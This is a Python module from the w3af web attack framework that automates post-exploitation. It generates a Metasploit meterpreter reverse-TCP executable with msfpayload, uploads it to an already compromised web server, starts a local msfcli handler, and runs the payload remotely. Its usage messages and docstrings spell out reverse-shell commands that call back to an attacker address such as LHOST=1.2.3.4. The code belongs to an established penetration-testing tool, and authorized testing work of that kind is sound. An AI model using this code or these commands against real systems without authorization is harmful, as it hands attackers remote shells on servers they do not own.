"""
vdaemon.py

Copyright 2010 Andres Riancho

This file is part of w3af, http://w3af.org/ .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

"""
import os
import tempfile
import random
import time

import subprocess32 as subprocess

import w3af.core.data.kb.config as cf
import w3af.core.controllers.output_manager as om

from w3af.core.controllers.exceptions import BaseFrameworkException
from w3af.core.controllers.payload_transfer.payload_transfer_factory import payload_transfer_factory
from w3af.core.controllers.intrusion_tools.execMethodHelpers import get_remote_temp_file


class vdaemon(object):
    """
    This class represents a virtual daemon that will run metasploit's
    msfpayload, create an executable file, upload it to the remote server, run
    the payload handler locally and finally execute the payload in the remote
    server.

    This class should be sub-classed by winVd and lnxVd, each implementing a
    different way of sending the metasploit payload to the remote web server.

    :author: Andres Riancho (andres.riancho@gmail.com)
    """
    def __init__(self, exec_method):

        # This is the method that will be used to send the metasploit payload to
        # the remote webserver ( using echo $payload > file )
        self._exec_method = exec_method

        self._metasploit_location = cf.cf.get('msf_location')
        self._msfpayload_path = os.path.join(
            self._metasploit_location, 'msfpayload')
        self._msfcli_path = os.path.join(self._metasploit_location, 'msfcli')

    def run(self, user_defined_parameters):
        """
        This is the entry point. We get here when the user runs the
        "payload vdaemon linux/x86/meterpreter/reverse_tcp" command in his w3af
        shell after exploiting a vulnerability.

        :param user_defined_parameters: The parameters defined by the user, for
                                        example, the type of payload to send.
        :return: True if we succeded.
        """

        #
        # We follow the same order as MSF, but we only allow the user to
        # generate executable files
        #
        #    Usage: /opt/metasploit3/msf3/msfpayload <payload> [var=val] ...
        #
        msg = 'IMPORTANT:\n'
        msg += '    You need to specify the payload type in MSF format as if you '
        msg += 'were calling msfpayload: \n'
        msg += '    linux/x86/meterpreter/reverse_tcp LHOST=1.2.3.4\n'
        msg += '    And then add a pipe ("|") to add the msfcli parameters for '
        msg += 'handling the incoming connection (in the case of a reverse '
        msg += 'shell) or connect to the remote server.\n'
        msg += '    A complete example looks like this:\n'
        msg += '    linux/x86/meterpreter/reverse_tcp LHOST=1.2.3.4 | exploit/multi/handler PAYLOAD=linux/x86/meterpreter/reverse_tcp LHOST=1.2.3.4 E'

        if '|' not in user_defined_parameters:
            raise ValueError(msg)

        msfpayload_parameters = user_defined_parameters[:
                                                        user_defined_parameters.index('|')]
        msfcli_parameters = user_defined_parameters[
            user_defined_parameters.index('|') + 1:]

        payload = msfpayload_parameters[0]
        msfpayload_parameters = msfpayload_parameters[1:]

        msfcli_handler = msfcli_parameters[0]
        msfcli_parameters = msfcli_parameters[1:]

        try:
            executable_file_name = self._generate_exe(payload,
                                                      msfpayload_parameters)
        except Exception, e:
            raise BaseFrameworkException(
                'Failed to create the payload file, error: "%s".' % str(e))

        try:
            remote_file_location = self._send_exe_to_server(
                executable_file_name)
        except BaseFrameworkException, e:
            error_msg = 'Failed to send the payload file, error: "%s".'
            raise BaseFrameworkException(error_msg % e)
        else:
            om.out.console('Successfully transfered the MSF payload to the'
                           ' remote server.')

            #
            #    Good, the file is there, now we launch the local listener and
            #    then we execute the remote payload
            #
            if not self._start_local_listener(msfcli_handler, msfcli_parameters):
                error_msg = 'Failed to start the local listener for "%s"'
                om.out.console(error_msg % payload)
            else:
                try:
                    self._exec_payload(remote_file_location)
                except Exception, e:
                    raise BaseFrameworkException('Failed to execute the executable file on the server, error: %s' % e)
                else:
                    om.out.console('Successfully executed the MSF payload on the remote server.')

    def _start_local_listener(self, msfcli_handler, parameters):
        """
        Runs something similar to:

        ./msfcli exploit/multi/handler PAYLOAD=windows/shell/reverse_tcp LHOST=192.168.1.112 E

        In a new console.

        :return: True if it was possible to start the listener in a new console
        """
        args = (self._msfcli_path, msfcli_handler, ' '.join(parameters))
        msfcli_command = '%s %s %s' % args
        om.out.console('Running a new terminal with the payload handler ("%s")' % msfcli_command)

        # TODO: Add support for KDE, Windows, etc.
        subprocess.Popen(['gnome-terminal', '-e', msfcli_command])

        # Some slow systems require time to load msfcli
        time.sleep(10)

        # TODO: Better response!
        return True

    def _generate_exe(self, payload, parameters):
        """
        This method should be implemented according to the remote operating
        system. The idea here is to generate an ELF/PE file and return a string
        that represents it.

        The method will basically run something like:
        msfpayload linux/x86/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=8443 X > /tmp/output2.exe

        :param payload: The payload to generate (linux/x86/meterpreter/reverse_tcp)
        :param parameters: A list with the parameters to send to msfpayload ['LHOST=1.2.3.4', 'LPORT=8443']

        :return: The name of the generated file, in the example above: "/tmp/output2.exe"
        """
        temp_dir = tempfile.gettempdir()
        randomness = str(random.randint(0, 293829839))
        output_filename = os.path.join(temp_dir, 'msf-' + randomness + '.exe')

        command = '%s %s %s X > %s' % (self._msfpayload_path, payload,
                                       ' '.join(parameters), output_filename)
        os.system(command)

        if 'reverse' in payload:
            om.out.console('Remember to setup your firewall to allow the reverse connection!')

        if os.path.isfile(output_filename):

            #    Error handling
            file_content = file(output_filename).read()
            for tag in ['Invalid', 'Error']:
                if tag in file_content:
                    raise BaseFrameworkException(file_content.strip())

            return output_filename
        else:
            raise BaseFrameworkException(
                'Something failed while creating the payload file.')

    def _send_exe_to_server(self, exe_file):
        """
        This method should be implemented according to the remote operating
        system. The idea here is to send the exe_file to the remote server and
        save it in a file.

        :param exe_file: The local path to the executable file
        :return: The name of the remote file that was uploaded.
        """
        om.out.debug('Called _send_exe_to_server()')
        om.out.console(
            'Wait while w3af uploads the payload to the remote server...')

        ptf = payload_transfer_factory(self._exec_method)

        # Now we get the transfer handler
        wait_time_for_extrusion_scan = ptf.estimate_transfer_time()
        transferHandler = ptf.get_transfer_handler()

        if not transferHandler.can_transfer():
            raise BaseFrameworkException('Can\'t transfer the file to remote host,'
                                ' can_transfer() returned False.')
        else:
            om.out.debug('The transferHandler can upload files to the remote'
                         ' end.')

            estimatedTime = transferHandler.estimate_transfer_time(
                len(exe_file))
            om.out.debug('The payload transfer will take "' +
                         str(estimatedTime) + '" seconds.')

            self._remote_filename = get_remote_temp_file(self._exec_method)
            om.out.debug('Starting payload upload, remote filename is: "' +
                         self._remote_filename + '".')

            if transferHandler.transfer(file(exe_file).read(), self._remote_filename):
                om.out.console(
                    'Finished payload upload to "%s"' % self._remote_filename)
                return self._remote_filename
            else:
                raise BaseFrameworkException(
                    'The payload upload failed, remote md5sum is different.')

    def _exec_payload(self, remote_file_location):
        """
        This method should be implemented according to the remote operating
        system. The idea here is to execute the payload that was sent using
        _send_exe_to_server and generated by _generate_exe . In lnxVd I should
        run "chmod +x file; ./file"

        This method should be implemented in winVd and lnxVd.
        """
        raise BaseFrameworkException('Please implement the _exec_payload method.')

    def _exec(self, command):
        """
        A wrapper for executing commands
        """
        om.out.debug('Executing: ' + command)
        response = apply(self._exec_method, (command,))
        om.out.debug('"' + command + '" returned: ' + response)
        return response
